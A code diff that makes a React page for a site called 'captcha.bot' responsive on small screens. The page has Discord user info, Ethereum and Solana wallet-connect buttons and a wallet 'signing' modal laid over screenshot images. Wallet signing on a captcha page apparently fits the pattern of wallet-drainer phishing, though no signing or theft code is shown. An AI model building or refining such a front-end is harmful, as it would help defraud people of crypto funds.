@@ -754,8 +754,8 @@ export default function Home() {
   return (
     <div className="min-h-screen bg-[#1a1b2e]">
       {/* Update Banner */}
-      <div className="w-full bg-[#4752c4] py-3 text-center" data-testid="banner-update">
-        <span className="text-white text-lg font-black tracking-wide" style={{ fontWeight: 900, fontSize: '1.25rem' }}>
+      <div className="w-full bg-[#4752c4] py-2 sm:py-3 text-center px-3" data-testid="banner-update">
+        <span className="text-white text-xs sm:text-sm md:text-lg font-black tracking-wide" style={{ fontWeight: 900 }}>
           New version of captcha.bot has been updated
         </span>
       </div>
@@ -763,7 +763,7 @@ export default function Home() {
       <div className="relative">
         <img src={section1} alt="" className="w-full h-auto block" data-testid="img-section1" />
         <div 
-          className="absolute flex flex-col items-end gap-2"
+          className="absolute flex flex-col items-end gap-1 sm:gap-2"
           style={{ 
             top: '3%', 
             right: '1%',
@@ -771,18 +771,18 @@ export default function Home() {
           }}
         >
           {discordUser && (
-            <div className="flex items-center gap-2 bg-[#2b2d31] rounded-[20px] px-3 py-1.5 mb-1" data-testid="discord-user-info">
+            <div className="flex items-center gap-1 sm:gap-2 bg-[#2b2d31] rounded-[20px] px-2 sm:px-3 py-1 sm:py-1.5 mb-0.5 sm:mb-1" data-testid="discord-user-info">
               {discordAvatar ? (
-                <img src={discordAvatar} alt="" className="w-6 h-6 rounded-full" />
+                <img src={discordAvatar} alt="" className="w-4 h-4 sm:w-6 sm:h-6 rounded-full" />
               ) : (
-                <div className="w-6 h-6 rounded-full bg-[#5865F2] flex items-center justify-center">
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
+                <div className="w-4 h-4 sm:w-6 sm:h-6 rounded-full bg-[#5865F2] flex items-center justify-center">
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="white" className="sm:w-[14px] sm:h-[14px]">
                     <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                     <circle cx="12" cy="7" r="4" />
                   </svg>
                 </div>
               )}
-              <span className="text-white text-sm font-medium">{discordUser}</span>
+              <span className="text-white text-[10px] sm:text-sm font-medium">{discordUser}</span>
               {discordVerified && (
                 <CheckCircle className="w-4 h-4 text-green-400" />
               )}
@@ -794,7 +794,7 @@ export default function Home() {
                 {isConnected && !solanaConnected && openChainModal && (
                   <button
                     onClick={openChainModal}
-                    className="flex items-center gap-2 bg-[#3a3f7a] hover:bg-[#4752c4] text-white font-medium rounded-[20px] px-4 py-2 text-sm cursor-pointer border-0 outline-none"
+                    className="flex items-center gap-1 sm:gap-2 bg-[#3a3f7a] hover:bg-[#4752c4] text-white font-medium rounded-[20px] px-2 sm:px-4 py-1 sm:py-2 text-[10px] sm:text-sm cursor-pointer border-0 outline-none"
                     data-testid="button-chain-switcher"
                   >
                     {chainId === 1 ? "Ethereum" : 
@@ -807,14 +807,14 @@ export default function Home() {
                     <ChevronDown className="w-4 h-4" />
                   </button>
                 )}
-                <span className="bg-[#3a3f7a] text-white font-medium rounded-[20px] px-4 py-2 text-sm">
+                <span className="bg-[#3a3f7a] text-white font-medium rounded-[20px] px-2 sm:px-4 py-1 sm:py-2 text-[10px] sm:text-sm">
                   {solanaConnected 
                     ? `${solanaAddress?.slice(0, 4)}...${solanaAddress?.slice(-4)}`
                     : `${address?.slice(0, 6)}...${address?.slice(-4)}`
                   }
                 </span>
                 <button 
-                  className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-7 py-3 text-base whitespace-nowrap shadow-lg"
+                  className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-3 sm:px-7 py-1.5 sm:py-3 text-xs sm:text-base whitespace-nowrap shadow-lg"
                   onClick={() => {
                     if (solanaConnected) {
                       disconnectSolanaWallet();
@@ -830,7 +830,7 @@ export default function Home() {
             </div>
           ) : (
             <button 
-              className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-7 py-3 text-base whitespace-nowrap shadow-lg"
+              className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-bold rounded-xl px-3 sm:px-7 py-1.5 sm:py-3 text-xs sm:text-base whitespace-nowrap shadow-lg"
               onClick={() => setShowUnifiedWalletModal(true)}
               data-testid="button-connect"
             >
@@ -856,8 +856,8 @@ export default function Home() {
       <img src={section6} alt="" className="w-full h-auto block" data-testid="img-section6" />
 
       {showSigningScreen && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-[250]">
-          <div className="bg-white rounded-3xl p-10 w-[420px] shadow-2xl flex flex-col items-center gap-6 relative">
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-[250] p-4">
+          <div className="bg-white rounded-3xl p-6 sm:p-10 w-full max-w-[420px] shadow-2xl flex flex-col items-center gap-4 sm:gap-6 relative">
             <div className="relative w-20 h-20">
               <svg className="absolute inset-0 w-20 h-20 animate-spin" viewBox="0 0 80 80">
                 <circle cx="40" cy="40" r="34" stroke="#e5e7eb" strokeWidth="5" fill="none" />
@@ -921,7 +921,7 @@ export default function Home() {
           onClick={() => setShowUnifiedWalletModal(false)}
         >
           <div 
-            className="bg-white rounded-3xl p-6 w-[420px] max-h-[80vh] shadow-2xl flex flex-col"
+            className="bg-white rounded-3xl p-4 sm:p-6 w-[calc(100%-2rem)] sm:w-[420px] max-h-[80vh] shadow-2xl flex flex-col mx-4"
             onClick={(e) => e.stopPropagation()}
           >
             <div className="flex items-center justify-between mb-6">
